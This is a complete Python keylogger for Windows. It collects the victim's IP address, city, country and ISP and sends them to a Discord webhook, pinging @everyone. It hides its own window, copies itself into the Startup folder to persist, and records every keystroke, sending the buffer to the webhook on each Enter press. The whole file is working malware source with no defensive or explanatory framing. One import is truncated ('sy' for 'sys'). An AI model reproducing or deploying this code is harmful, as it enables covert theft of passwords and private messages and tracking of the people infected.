from pynput import keyboard
import requests
import json
import win32gui
import win32con
import os
import shutil
import sy

#this stuff is just needed
webhook_url = 'your webhook goes here'
keys_buffer = [] #dont touch this

#api
api = requests.get("http://ip-api.com/json")
location = api.json()

#all the information gotten from the api
country = location.get("country")
countryCode = location.get("countryCode").lower()
city = location.get("city")
query_ip = location.get("query")
isp = location.get("isp")

#makes it start on pc start up
def add_to_startup():
    startup_folder = os.path.join(
        os.environ["APPDATA"],
        "Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    )
    script_path = os.path.realpath(sys.argv[0])
    target_path = os.path.join(startup_folder, os.path.basename(script_path))

    if not os.path.exists(target_path):
        shutil.copy(script_path, target_path)
        
#webhook sending stuff
def send_discord_message(webhook_url, message):
    data = {"content": message}
    headers = {"Content-Type": "application/json"}
    requests.post(webhook_url, json=data, headers=headers)    
payload = {
    "content": "@everyone",
}

#pings @everyone
requests.post(webhook_url, json=payload)

#embed where the users information is shown
embed = {
    "title": "Logged users information",
    "color": 0x00ffcc,
    "author": {
        "name": "Key logger"
    },
    "fields": [
        {
            "name": "Country",
            "value": f"Country: {country} :flag_{countryCode}:",
            "inline": False
        },
        {
            "name": "City",
            "value": f"City: {city}",
            "inline": False
        },
        {
            "name": "IP",
            "value": f"Ip: {query_ip}",
            "inline": False
        },
        {
            "name": "ISP",
            "value": f"Isp: {isp}",
            "inline": False
        }
    ]
}

#just some stuff to send the embed
information = {
    "embeds": [embed]
}

headers = {
    "Content-Type": "application/json"
}

#hides the program, sends all the info from api and adds code to startup
response = requests.post(webhook_url, data=json.dumps(information), headers=headers)
hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(hide, win32con.SW_HIDE)
add_to_startup()

#actual logger part sends the log after the person who is getting logged presses the enter key
def on_press(key):
    global keys_buffer

    try:
        keys_buffer.append(key.char)
    except AttributeError:
        if key == keyboard.Key.enter:
            message = ''.join(keys_buffer)
            send_discord_message(webhook_url, message)
            keys_buffer = []
        elif key == keyboard.Key.space:
            keys_buffer.append(' ')
        else:
            keys_buffer.append(f'[{key.name}]')

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()




